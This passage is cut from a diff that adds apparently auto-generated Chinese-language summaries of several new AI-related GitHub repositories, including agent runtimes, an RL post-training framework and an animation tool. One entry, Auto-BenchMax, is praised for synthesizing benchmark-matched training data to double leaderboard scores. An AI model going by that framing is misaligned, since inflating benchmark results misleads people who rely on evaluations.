+          "你希望评估和迭代AI Agent的性能 → 它记录完整的运行轨迹、性能指标和评估结果。",
+          "你计划基于Agent运行数据进行模型微调（SFT）→ 它能导出可用于外部训练的轨迹数据。"
+        ],
+        "audience": "专注于开发、测试和优化长周期AI Agent的研究人员、工程师和AI应用开发者。",
+        "quickStart": {
+          "prerequisites": "Python 3.12+，OpenAI兼容API或可插拔的本地模型客户端。",
+          "steps": [
+            "安装AxisAgentic库",
+            "配置模型客户端和Agent行为，运行Agent",
+            "收集并分析Agent的运行轨迹及性能数据"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（Apache-2.0开源许可证）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "这是一个AI Agent的运行时框架，提供基础设施而非直接的编码辅助或代码生成功能。",
+        "isVibeCoding": false,
+        "communityActivity": "新项目，Issue区尚未有活动，但已获得217个Star。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:30:41.112Z"
+    },
+    {
+      "owner": "sunny-glow",
+      "repo": "Auto-BenchMax",
+      "fullName": "sunny-glow/Auto-BenchMax",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-23T04:13:21Z",
+      "url": "https://github.com/sunny-glow/Auto-BenchMax",
+      "analysis": {
+        "positioning": "自动生成基准测试数据，一键提升模型得分。",
+        "useCases": [
+          "你追求大模型基准分数 → 它帮你自动合成定制训练数据，让模型在MCP-Atlas等榜单得分翻倍。",
+          "你搭建自己的工具调用/Agent基准 → 它帮你通过agent skill自动合成同分布的训练数据，省去手动标注烦恼。",
+          "你希望快速提升模型性能 → 它提供完整数据构建管线、训练代码和环境，让你一键复现并超越基线模型表现。"
+        ],
+        "audience": "大模型开发者和研究员，希望通过高效数据合成手段，快速提升模型在各类基准测试中的性能和排名。",
+        "quickStart": {
+          "prerequisites": "使用支持技能的Agent（如Claude Code）",
+          "steps": [
+            "将Agent指向你的评估入口点。",
+            "用一句话指令Agent读取技能并合成训练数据，例如：`My eval launch command is <your eval command>. Read this skill and synthesize training data for this benchmark.`"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目直击大模型开发者“追逐基准分”的痛点，提供了一套开箱即用、效果显著（一键2倍提升）的数据合成和训练方案，实用性和价值极高，能有效减轻开发者的重复劳动。",
+        "isVibeCoding": true,
+        "communityActivity": "Star数213，Issues开启3个/已关闭0个，表明有一定关注度，但问题解决的活跃度一般。",
+        "category": "LLM框架"
+      },
+      "analyzedAt": "2026-07-27T05:30:54.886Z"
+    },
+    {
+      "owner": "yokel1121",
+      "repo": "muyang-flat-animation",
+      "fullName": "yokel1121/muyang-flat-animation",
+      "description": "将中文观点转成纸上钢笔线稿与彩铅风格的知识讲解动画素材",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-22T08:12:41Z",
+      "url": "https://github.com/yokel1121/muyang-flat-animation",
+      "analysis": {
+        "positioning": "中文观点一键转纸上钢笔彩铅知识动画素材",
+        "useCases": [
+          "你想把抽象概念讲清楚 → 它帮你生成纸上钢笔彩铅讲解动画，无需设计和手绘",
+          "你做知识分享/科普视频 → 它帮你快速产出风格统一、动效自然的视觉素材",
+          "你需要自定义画幅和音效 → 它提供灵活配置，适配各种平台和需求"
+        ],
+        "audience": "知识分享者、科普创作者、教育工作者，需要将复杂概念快速可视化成动画讲解的用户。",
+        "quickStart": {
+          "prerequisites": "Python 3.10+, FFmpeg, FFprobe, 可用的 Gemini API Key",
+          "steps": [
+            "克隆仓库并安装依赖：`git clone ... && pip install -r requirements.txt`",
+            "将 Skill 目录复制到 Codex Skills 目录",
+            "设置 GEMINI_API_KEY 环境变量"
+          ],
+          "note": "macOS/Linux 与 Windows PowerShell 设置 API Key 方式不同"
+        },
+        "competitors": [],
+        "pricing": "部分免费 (工具本身开源免费，但依赖 Gemini API 需按量付费)",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目目标明确，解决中文知识讲解视频素材制作痛点，技术栈现代（Gemini），工作流清晰且支持高度定制化，实用性强。",
+        "isVibeCoding": true,
+        "communityActivity": "项目刚起步，社区活跃度待观察，目前无公开Issue。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:31:10.766Z"
+    },
+    {
+      "owner": "XYZ-AI-Lab",
+      "repo": "axrl",
+      "fullName": "XYZ-AI-Lab/axrl",
+      "description": "AxisRL is an agentic RL post-training framework built on SGLang rollout, Megatron training, and real-world agent workflows.",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-07-23T06:07:23Z",
+      "url": "https://github.com/XYZ-AI-Lab/axrl",
+      "analysis": {
+        "positioning": "大模型Agent强化学习后训练框架，整合高吞吐推理与大规模分布式训练。",
+        "useCases": [
+          "你希望训练能多轮交互、调用工具的Agent模型 → 它帮你协调多轮Rollout、环境状态、工具调用、奖励收集和权重同步。",
+          "你需要在千亿参数规模的Agent模型上进行强化学习后训练，并追求高吞吐、低空闲时间 → 它帮你利用SGLang和Megatron实现高效Rollout和大规模分布式训练。",
+          "你需要灵活配置PPO、GRPO等多种强化学习优化算法，并确保Rollout与训练的数据一致性 → 它提供多种策略优化目标和数据一致性机制。"
+        ],
+        "audience": "专注于大模型Agent强化学习后训练的AI研究员和工程师，尤其在处理多轮交互和大规模分布式训练场景时。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "查看项目README获取详细的安装和使用指南。",
+            "参考官方文档和示例代码，配置你的Agent环境并启动后训练流程。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（Apache-2.0开源许可证）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "作为Agent模型强化学习后训练的系统级解决方案，它整合了复杂的大规模分布式训练和高吞吐Rollout，大大简化了专业AI工程师的工作流程，效率提升显著。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前Issue开闭数量均为0，可能项目较新或主要由内部团队维护。",
+        "category": "LLM框架"
+      },
+      "analyzedAt": "2026-07-27T05:31:29.226Z"
+    },
+    {
+      "owner": "risa-labs-inc",
+      "repo": "BossConsole",
+      "fullName": "risa-labs-inc/BossConsole",
+      "description": "Open-source, multi-platform harness for AI agents — a native, multi-threaded operator's console (JVM, not Electron) to run Claude Code, Codex, Gemini or OpenCode with a real browser, terminal, editor, secrets & 100+ MCP tools. Built for enterprises, science & research.",
+      "language": "Kotlin",
+      "topics": [
+        "agent-harness",
+        "ai-agents",
+        "browser",
+        "claude-code",
+        "codex",
+        "compose-multiplatform",
+        "desktop-app",
+        "gemini",
+        "hot-reload",
+        "jvm",
+        "kotlin-multiplatform",
+        "llm",
+        "mcp",
+        "model-context-protocol",
+        "multithreading",
+        "open-source",
+        "opencode",
+        "rbac",
+        "terminal"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-07-21T01:01:05Z",
+      "url": "https://github.com/risa-labs-inc/BossConsole",
+      "analysis": {
+        "positioning": "AI代理原生多平台控制台，全能工作台。",
+        "useCases": [
+          "你集成多种AI代理（如Claude Code, Gemini）进行开发 → 它提供原生多线程工作台，让代理拥有真实浏览器、终端、编辑器。",
+          "你希望AI代理能自主感知并操作整个工作空间完成复杂任务 → 它通过100+MCP工具让代理直接驱动应用，实现复杂任务自动化。",
+          "你需要安全、可控地运行AI代理，并跨设备共享终端 → 它提供RBAC权限管理，支持本地运行、热重载和移动端终端共享。"
+        ],
+        "audience": "企业、科研人员及需要高度可控、多功能AI代理工作台的开发者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "访问项目发布页 [BossConsole-Releases](https://github.com/risa-labs-inc/BossConsole-Releases)。",
+            "下载适用于你操作系统的预编译安装包。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Claude Desktop",
+            "method": "桌面应用（闭源）",
+            "models": "仅限Claude",
+            "pricing": "商业（闭源）"
+          },
+          {
+            "name": "Cursor",
+            "method": "Agentic IDE（闭源）",
+            "models": "特定模型",
+            "pricing": "商业（闭源）"
+          }
+        ],
+        "pricing": "免费，Apache-2.0 开源。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "JVM原生多线程，非Electron，高性能。Kotlin Multiplatform和Compose Multiplatform构建，开放源码，支持热重载和高度可扩展的工具箱，直击痛点。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃度良好，Issue解决率高（9/15），有持续维护。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:31:42.973Z"
     }
   ]
 }
